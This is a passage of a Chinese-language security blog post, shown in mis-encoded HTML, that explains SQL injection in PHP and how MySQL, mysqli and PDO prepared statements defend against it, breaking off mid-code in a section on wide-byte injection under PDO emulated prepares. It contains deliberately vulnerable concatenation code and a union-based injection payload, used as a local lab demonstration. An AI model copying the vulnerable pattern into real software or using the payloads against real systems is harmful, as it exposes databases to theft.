    <content type="html"><![CDATA[<h2 id="SQLæ³¨å…¥-amp-é¢„ç¼–è¯‘"><a href="#SQLæ³¨å…¥-amp-é¢„ç¼–è¯‘" class="headerlink" title="SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘"></a>SQLæ³¨å…¥&amp;é¢„ç¼–è¯‘</h2><p>è¿™ç¯‡æ–‡ç« æ¥æºäºè¢«é¢„ç¼–è¯‘æçš„å¤´ç–¼ï¼Œæ¡åƒåœ¾çš„æˆ‘åªæ˜¯æƒ³æ¡ä¸ªæ³¨å…¥ï¼Œç„¶é¹…éšç€ä½¿ç”¨é¢„ç¼–è¯‘çš„å¹¿æ³›ä½¿ç”¨ï¼Œè®©æˆ‘è¿™ä¸ªæ¡åƒåœ¾çš„æ¡ä¸åˆ°æ³¨å…¥äº†ã€‚ä½†å¬è¯´é¢„ç¼–è¯‘é˜²æ­¢ä¸äº†æ’åºå¤„çš„æ³¨å…¥ï¼Œäºæ˜¯ä¹æƒ³è‡ªå·±çœ‹ä¸€ä¸‹ï¼Œç„¶åå°±åˆèƒ½å¤šä¸ªæ¡åƒåœ¾çš„è·¯å­äº†ã€‚å¤šæ¡ç‚¹åƒåœ¾çš„è¯æ™šä¸Šå°±èƒ½åŠ ä¸ªè›‹äº†Q_A_Q</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/1.png"></p><h3 id="æ‹¼æ¥"><a href="#æ‹¼æ¥" class="headerlink" title="æ‹¼æ¥"></a>æ‹¼æ¥</h3><p>å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œç”¨æˆ·çš„ä¼ å‚æ˜¯èƒ½å¤Ÿç›´æ¥æ‹¼æ¥åˆ°sqlçš„æŸ¥è¯¢è¯­å¥ä¸­å»ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">// index.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br>mysqli_select_db($conn,sort) or die ( &quot;Unable to connect to the database: test&quot;);<br># é€‰æ‹©æ•°æ®åº“<br><br>$sql = &quot;select fraction from fraction where name = &#x27;$username&#x27;;&quot;;# ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥è¿›å­—ç¬¦ä¸²<br>$result = mysqli_query($conn,$sql);<br>echo &#x27;&lt;br/&gt;&#x27;.$sql.&#x27;&lt;br/&gt;&#x27;;# æ‰“å°sqlè¯­å¥<br><br>if($fraction = mysqli_fetch_assoc( $result ))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>&#125;<br>else&#123;<br>    mysqli_error($conn);<br>&#125;<br><br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;åˆ†æ•°:&#x27;.$fraction[&#x27;fraction&#x27;];<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ„å»ºäº†ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢åˆ†æ•°çš„åŠŸèƒ½ï¼Œå¯ä»¥çœ‹åˆ°ç›´æ¥å°†ç”¨æˆ·çš„è¾“å…¥å¸¦å…¥åˆ°äº†sqlè¯­å¥ä¸­ï¼Œè¿™sqlæ³¨å…¥å¾ˆæ˜æ˜¾äº†</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/2.png" alt="åˆ†æ•°è¡¨"></p><p>è¿™é‡Œå¯ä»¥ç›´æ¥æ„é€ payloadæ¥å®ç°æ³¨å…¥</p><p>payload:<code>1&#39;union select database();#</code></p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/3.png"></p><p>è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœåšå®‰å…¨é˜²æŠ¤çš„è¯ï¼Œä¹Ÿåªèƒ½æ˜¯ä»æ•ˆéªŒç”¨æˆ·çš„è¾“å…¥å…¥æ‰‹äº†ï¼Œä½†æ˜¯æ•ˆéªŒè§„åˆ™å¤§æ¦‚ç‡éƒ½èƒ½è¿›è¡Œç»•è¿‡ï¼Œåªä¸è¿‡æ˜¯ç»•çš„éš¾æ˜“ä¸ä¸€æ ·ç½¢äº†ã€‚ä½†æ˜¯ç°åœ¨å·²ç»è¿›å…¥åˆ°äº†é¢„ç¼–è¯‘çš„æ—¶ä»£ï¼Œæ‹¼æ¥çš„æƒ…å†µè™½ç„¶æœ‰ï¼Œä½†è¾ƒå°‘äº†ï¼Œå†åŠ ä¸Šé˜²æŠ¤è®¾å¤‡çš„å¹¿æ³›åº”ç”¨ï¼Œ</p><h3 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h3><p>æ®å¬è¯´ï¼Œé¢„ç¼–è¯‘ä¸€å¼€å§‹æ˜¯ä¸ºäº†æé«˜MySQLçš„è¿è¡Œæ•ˆç‡è€Œè¯ç”Ÿï¼Œä½†æ˜¯ç”±äºå…¶å…ˆæ„å»ºè¯­æ³•æ ‘ï¼Œåå¸¦å…¥æŸ¥è¯¢å‚æ•°çš„ç‰¹æ€§å¯¼è‡´å…¶å…·æœ‰äº†é˜²æ­¢SQLæ³¨å…¥çš„ç‰¹æ€§ã€‚è¿™é‡Œç®€å•è¯´ä¸€ä¸‹MySQLçš„é¢„å¤„ç†è¯­å¥çš„ä½¿ç”¨ï¼Œä»¥åŠé˜²æ­¢SQLçš„æ³¨å…¥çš„åŸå› (å› ä¸ºå…¶ä»–æ•°æ®åº“ä¸€ç‚¹ä¸ä¼š)</p><h4 id="MySQLé¢„ç¼–è¯‘"><a href="#MySQLé¢„ç¼–è¯‘" class="headerlink" title="MySQLé¢„ç¼–è¯‘"></a>MySQLé¢„ç¼–è¯‘</h4><p>MySQLé¢„ç¼–è¯‘æ‰§è¡Œåˆ†ä¸ºä¸‰æ­¥ï¼š</p><p>1.æ‰§è¡Œé¢„ç¼–è¯‘è¯­å¥ï¼Œæ„å»ºè¯­æ³•æ ‘ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from &quot;select fraction from fraction where name = ?&quot;;<br># ä½¿ç”¨PREPARE stmt_name FROM preparable_stmè¯­æ³•<br># stmt_nameæ˜¯è¯­å¥åï¼Œpreparable_stmæ˜¯å…·ä½“è¦æ‰§è¡Œçš„è¯­å¥ï¼Œå˜é‡å…ˆç”± ï¼Ÿ è¿›è¡Œå ä½<br></code></pre></td></tr></table></figure><p>2.è®¾ç½®å˜é‡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @a=&#x27;mechoy&#x27;;<br></code></pre></td></tr></table></figure><p>3.æ‰§è¡Œï¼Œå°†è®¾ç½®çš„å˜é‡ä»£å…¥åˆ°å·²ç»æ„å»ºå¥½çš„è¯­å¥ä¸­è¿›è¡Œæ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel using @a;<br># ä½¿ç”¨EXECUTE stmt_name [USING @var_name [, @var_name] ...]è¯­æ³•<br># å˜é‡ä½ç½®ä¸å ä½ç¬¦ä¸€ä¸€å¯¹åº”<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æŸåæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/4.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ—¶ï¼Œæ•°æ®åº“å…±è¿›è¡Œäº†å››æ­¥æ“ä½œï¼š1.æ„å»ºé¢„å¤„ç†è¯­å¥ï¼›2.è®¾ç½®å˜é‡ï¼›3.ç»‘å®šå˜é‡ï¼›4.æ‰§è¡ŒæŸ¥è¯¢</p><p>é¢„ç¼–è¯‘çš„ä¼˜åŠ¿åœ¨äºå…¶ä¸ç”¨æ¯ä¸€æ¬¡éƒ½æ„å»ºè¯­æ³•æ ‘ï¼Œä»¥ä¸Šé¢ä¸ºä¾‹ï¼Œå½“æœ‰<code>@b=&#39;admin&#39;</code>æ—¶ï¼Œæ‰§è¡Œ<code>execute sel using @b;</code>æ—¶ï¼Œæ•°æ®åº“ä¼šç›´æ¥å»fractionè¡¨ä¸­æŸ¥è¯¢<code>name=admin</code>çš„fractionå€¼ï¼Œè€Œä¸ç”¨å†ä¸€æ¬¡æ„å»ºè¯­æ³•æ ‘ï¼Œè¿™å¯èƒ½ä¹Ÿå°±æ˜¯é¢„ç¼–è¯‘è¯­å¥ä¸ºä½•èƒ½æé«˜MySQLæ•ˆç‡çš„åŸå› </p><p>è€Œé¢„ç¼–è¯‘è¯­å¥åœ¨é˜²æ­¢SQLæ³¨å…¥ä¸Šï¼Œçœ‹ä¸‹é¢è¿™å¼ å›¾ï¼š</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/5.png"></p><p>åœ¨@bå’Œ@cçš„æƒ…å†µä¸‹è¿”å›éƒ½ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯å°†@bå’Œ@cçš„å€¼åªæ˜¯å½“åšä¸€ä¸ªå˜é‡ï¼Œå»å¯»æ‰¾nameå­—æ®µä¸­ä¸å…¶ç›¸åŒçš„</p><p>å¦‚æœåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡<code>name=xx union select database()</code>æ•°æ®ï¼Œå†æ¬¡æ‰§è¡Œå°±ä¼šè·å¾—ç›¸åº”çš„å€¼</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/6.png"></p><p>å†æ‰§è¡Œå°±ä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; execute sel using @c;<br>+----------+<br>| fraction |<br>+----------+<br>|      100 |<br>+----------+<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå˜é‡åªæ˜¯ä¸€ä¸ªå˜é‡ï¼Œåªæ˜¯ç”¨æ¥æ¯”è¾ƒnameå­—æ®µä¸­æ˜¯å¦å­˜åœ¨ç›¸åŒçš„å€¼ï¼Œå­˜åœ¨åˆ™è¿”å›fractionçš„å€¼ï¼Œä¸å­˜åœ¨åˆ™è¿”å›ç©ºï¼Œè¿™å°±æ˜¯é¢„ç¼–è¯‘ä¸ºä»€ä¹ˆèƒ½é˜²æ­¢SQLæ³¨å…¥çš„åŸå› ã€‚</p><h4 id="PHP-MySQL-é¢„å¤„ç†è¯­å¥"><a href="#PHP-MySQL-é¢„å¤„ç†è¯­å¥" class="headerlink" title="PHP+MySQL é¢„å¤„ç†è¯­å¥"></a>PHP+MySQL é¢„å¤„ç†è¯­å¥</h4><p>åœ¨ä½¿ç”¨PHPç¼–å†™é¢„å¤„ç†è¯­å¥æ—¶ï¼Œä¼šé‡åˆ°é¢„ç¼–è¯‘å’Œæ¨¡æ‹Ÿé¢„ç¼–è¯‘(è¿™é‡Œå…ˆæä¸€ä¸‹)</p><p>PHPä¸­è¿æ¥MySQLæ•°æ®åº“ç›®å‰ä¸¤ç§è¾ƒä¸ºå¸¸è§çš„æ–¹æ³•ï¼š</p><ul><li>Mysqli</li><li>PDO</li></ul><p>è¿™é‡Œå…ˆè¯´ä¸€ä¸‹ä½¿ç”¨Mysqliçš„é¢„ç¼–è¯‘è¯­å¥è¿›è¡Œæ•°æ®çš„æŸ¥è¯¢</p><h5 id="Mysqli"><a href="#Mysqli" class="headerlink" title="Mysqli"></a>Mysqli</h5><p><code>Mysqli</code>æ‰©å±•å…è®¸æˆ‘ä»¬è®¿é—®MySQL 4.1åŠä»¥ä¸Šç‰ˆæœ¬æä¾›çš„åŠŸèƒ½ã€‚</p><p>ä½¿ç”¨PHPçš„Mysqliå®ç°é¢„ç¼–è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index1.php<br># $connä¸ºä¸mysqlæ•°æ®åº“å»ºç«‹çš„é“¾æ¥ï¼ŒåŒæ—¶é€‰æ‹©<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;];<br><br># $stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = ?&quot;);   é¢„å¤„ç†ä»¥åŠç»‘å®š<br>$stmt = mysqli_stmt_init($conn);    # åˆ†é…å¹¶åˆå§‹åŒ–ä¸€ä¸ªè¯­å¥å¯¹è±¡ç”¨äºmysqli_stmt_prepare()ã€‚<br>mysqli_stmt_prepare($stmt,&quot;select fraction from fraction where name = ?&quot;);  # é¢„å¤„ç†<br>mysqli_stmt_bind_param($stmt,&quot;s&quot;, $username);   # ç»‘å®š<br><br># $stmt-&gt;execute();# æ‰§è¡Œ<br>mysqli_stmt_execute($stmt);<br>mysqli_stmt_bind_result($stmt,$fraction);   # å°†æŸ¥è¯¢ç»“æœç»‘å®šè‡³$fraction<br><br>if(mysqli_stmt_fetch($stmt))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;åˆ†æ•°:&#x27;.$fraction;<br>print(&quot;åˆ†æ•°: &quot;.$fraction.&quot;\n&quot;);<br>&#125;<br>else&#123;<br>    mysqli_stmt_errno($stmt);<br>&#125;<br><br>$conn-&gt;close();<br>?&gt;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Connectroot@localhost on sort using TCP/IP<br>Prepareselect fraction from fraction where name = ?<br>Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br># å¯ä»¥çœ‹åˆ°è¿™é‡Œå…±åˆ†æˆäº†ä¸‰æ­¥ï¼š1.å»ºç«‹è¿æ¥ï¼›2.æ„å»ºè¯­æ³•æ ‘ï¼›3.æ‰§è¡Œ<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹èµ·æ¥è·ŸMySQLçš„é¢„å¤„ç†è¯­å¥åŸºæœ¬ç›¸åŒï¼Œåªä¸è¿‡å› ä¸ºè¿™é‡Œå°‘äº†è®¾ç½®å˜é‡å’Œå°†å˜é‡ç»‘å®šè¿›é¢„ç¼–è¯‘çš„ä¸¤æ­¥ã€‚</p><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&#39; union select database();#&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy\&#x27; union select database();#&#x27;<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™é‡Œè¾“å…¥çš„å•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œé¢„ç¼–è¯‘+è½¬ä¹‰ï¼Œå¥½åƒè·ŸSQLæ³¨å…¥è¯´å†è§äº†ï¼Œå¯¹äºæˆ‘è¿™ä¸ªåªä¼šSqlmapä¸€æŠŠæ¢­çš„äººï¼Œå¥½åƒè·Ÿå…¨ä¸–ç•Œå†è§äº†</p><p><img src="/2022/01/30/SQL%E6%B3%A8%E5%85%A5&%E9%A2%84%E7%BC%96%E8%AF%91/8.png"></p><h5 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h5><ul><li>PHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚</li><li>PDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚</li><li>PDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚</li></ul><p>ä½¿ç”¨PDOå®ç°é¢„ç¼–è¯‘å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"># index2.php<br>&lt;?php<br>$username = $_POST[&#x27;username&#x27;]; // æ¥æ”¶username<br><br># å»ºç«‹æ•°æ®åº“è¿æ¥<br>header(&quot;Content-Type:text/html;charset=utf-8&quot;);<br>$dbs = &quot;mysql:host=127.0.0.1;dbname=sort&quot;;<br>$dbname = &quot;root&quot;;<br>$passwd = &quot;root&quot;;<br><br>// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥<br>try&#123;<br>    $conn = new PDO($dbs, $dbname, $passwd);<br>    echo &quot;è¿æ¥æˆåŠŸ&lt;br/&gt;&quot;;<br>&#125;<br>catch (PDOException $e)&#123;<br>    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);<br>&#125;<br><br># è®¾ç½®é¢„ç¼–è¯‘è¯­å¥ï¼Œç»‘å®šå‚æ•°ï¼Œè¿™é‡Œä½¿ç”¨å‘½åå ä½ç¬¦<br>$stmt = $conn-&gt;prepare(&quot;select fraction from fraction where name = :username&quot;);<br>$stmt-&gt;bindParam(&quot;:username&quot;,$username);<br>$stmt-&gt;execute();<br><br>if($fraction = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;<br>    echo &#x27;æŸ¥è¯¢æˆåŠŸ&#x27;;<br>echo &#x27;&lt;br/&gt;&#x27;;<br>echo &#x27;å­¦ç”Ÿ:&#x27;.$username;<br>echo &#x27;&lt;br/&gt;&#x27;;<br># echo &#x27;åˆ†æ•°:&#x27;.$fraction;<br>print_r(&quot;åˆ†æ•°&quot;.$fraction[fraction]);<br>&#125;<br>else&#123;<br><br>&#125;<br>$conn=null; # å…³é—­é“¾æ¥<br>?&gt;<br></code></pre></td></tr></table></figure><p>æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">27 Connectroot@localhost on sort using TCP/IP# ç®€å†è¿æ¥<br>27 Queryselect fraction from fraction where name = &#x27;mechoy&#x27;# æ‰§è¡ŒæŸ¥è¯¢<br>27 Quit# ç»“æŸ<br></code></pre></td></tr></table></figure><p>ä»æ—¥å¿—æ¥çœ‹ï¼Œæ²¡æœ‰prepareå’Œexecuteï¼Œåªæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªæŸ¥è¯¢çš„SQLè¯­å¥ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œé¢„ç¼–è¯‘ã€‚æ˜¾ç„¶ï¼ŒPDOé»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨çš„æ˜¯æ¨¡æ‹Ÿé¢„ç¼–è¯‘ã€‚</p><blockquote><p>æ¨¡æ‹Ÿé¢„ç¼–è¯‘æ˜¯é˜²æ­¢æŸäº›æ•°æ®åº“ä¸æ”¯æŒé¢„ç¼–è¯‘è€Œè®¾ç½®çš„(å¦‚sqlliteä¸ä½ç‰ˆæœ¬MySQL)ã€‚å¦‚æœæ¨¡æ‹Ÿé¢„å¤„ç†å¼€å¯ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯ç¨‹åºå†…éƒ¨ä¼šæ¨¡æ‹ŸMySQLæ•°æ®åº“ä¸­çš„å‚æ•°ç»‘å®šè¿™ä¸€è¿‡ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºä¼šåœ¨å†…éƒ¨æ¨¡æ‹Ÿprepareçš„è¿‡ç¨‹ï¼Œå½“æ‰§è¡Œexecuteæ—¶ï¼Œå†å°†æ‹¼æ¥åçš„å®Œæ•´SQLè¯­å¥å‘é€ç»™MySQLæ•°æ®åº“æ‰§è¡Œã€‚</p></blockquote><p>è€Œæƒ³è¦çœŸæ­£ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œé¦–å…ˆéœ€è¦æ•°æ®åº“æ”¯æŒé¢„ç¼–è¯‘ï¼Œå†åœ¨ä»£ç ä¸­åŠ å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span> -&gt; setAttribute(PDO::ATTR_EMULATE_PREPARES, <span class="hljs-literal">false</span>);<br><span class="hljs-comment"># bool PDO::setAttribute ( int $attribute , mixed  $value )è®¾ç½®æ•°æ®åº“å¥æŸ„å±æ€§ã€‚</span><br><span class="hljs-comment"># PDO::ATTR_EMULATE_PREPARES å¯ç”¨æˆ–ç¦ç”¨é¢„å¤„ç†è¯­å¥çš„æ¨¡æ‹Ÿã€‚ æœ‰äº›é©±åŠ¨ä¸æ”¯æŒæˆ–æœ‰é™åº¦åœ°æ”¯æŒæœ¬åœ°é¢„å¤„ç†ã€‚ä½¿ç”¨æ­¤è®¾ç½®å¼ºåˆ¶PDOæ€»æ˜¯æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ï¼ˆå¦‚æœä¸º TRUE  ï¼‰ï¼Œæˆ–è¯•ç€ä½¿ç”¨æœ¬åœ°é¢„å¤„ç†è¯­å¥ï¼ˆå¦‚æœä¸º FALSE ï¼‰ã€‚å¦‚æœé©±åŠ¨ä¸èƒ½æˆåŠŸé¢„å¤„ç†å½“å‰æŸ¥è¯¢ï¼Œå®ƒå°†æ€»æ˜¯å›åˆ°æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ä¸Šã€‚éœ€è¦ bool  ç±»å‹ã€‚ </span><br><span class="hljs-comment">#è¿™é‡Œåœ¨PHP5.2.17æ—¶æ— æ•ˆï¼Œæš‚æœªæ‰¾åˆ°åŸå› </span><br><span class="hljs-comment">#æ›´æ”¹ç‰ˆæœ¬ä¸ºPHP5.6.9æ—¶ç”Ÿæ•ˆ</span><br></code></pre></td></tr></table></figure><p>å†æ‰§è¡ŒæŸ¥è¯¢<code>name=&quot;mechoy&quot;</code>ï¼ŒæŸ¥çœ‹æ•°æ®åº“æ—¥å¿—ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">4 Connectroot@localhost on sort using TCP/IP<br>4 Prepareselect fraction from fraction where name = ?<br>4 Executeselect fraction from fraction where name = &#x27;mechoy&#x27;<br>4 Close stmt<br>4 Quit<br># å¯ä»¥çœ‹åˆ°å½“PDO::ATTR_EMULATE_PREPARESè®¾ç½®ä¸ºfalseæ—¶ï¼Œå–æ¶ˆäº†æ¨¡æ‹Ÿé¢„å¤„ç†ï¼Œé‡‡ç”¨æœ¬åœ°é¢„å¤„ç†<br></code></pre></td></tr></table></figure><h3 id="é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥"><a href="#é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥" class="headerlink" title="é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥"></a>é¢„ç¼–è¯‘æ‰€ä¸èƒ½é˜²èŒƒçš„æ³¨å…¥</h3><h4 id="PDOæ¨¡æ‹Ÿé¢„å¤„ç†-å®½å­—èŠ‚"><a href="#PDOæ¨¡æ‹Ÿé¢„å¤„ç†-å®½å­—èŠ‚" class="headerlink" title="PDOæ¨¡æ‹Ÿé¢„å¤„ç†+å®½å­—èŠ‚"></a>PDOæ¨¡æ‹Ÿé¢„å¤„ç†+å®½å­—èŠ‚</h4><p>æ¨¡æ‹Ÿä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index3.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// PHP5.2.17+MySQL5.7.26+Apache2.4.39ç¯å¢ƒä¸‹</span><br><span class="hljs-comment">// PHP5.6.9æ—¶æ— æ³•å®ç°</span><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <span class="hljs-comment">// æ¥æ”¶username</span><br><br><span class="hljs-comment"># å»ºç«‹æ•°æ®åº“è¿æ¥</span><br><span class="hljs-variable">$dbs</span> = <span class="hljs-string">&quot;mysql:host=127.0.0.1;dbname=sort1;charset=gbk&quot;</span>;<span class="hljs-comment">// è®¾ç½®æ•°æ®åº“å­—ç¬¦ç¼–ç </span><br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$passwd</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-comment">// åˆ›å»ºè¿æ¥,é€‰æ‹©æ•°æ®åº“,æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$conn</span> = <span 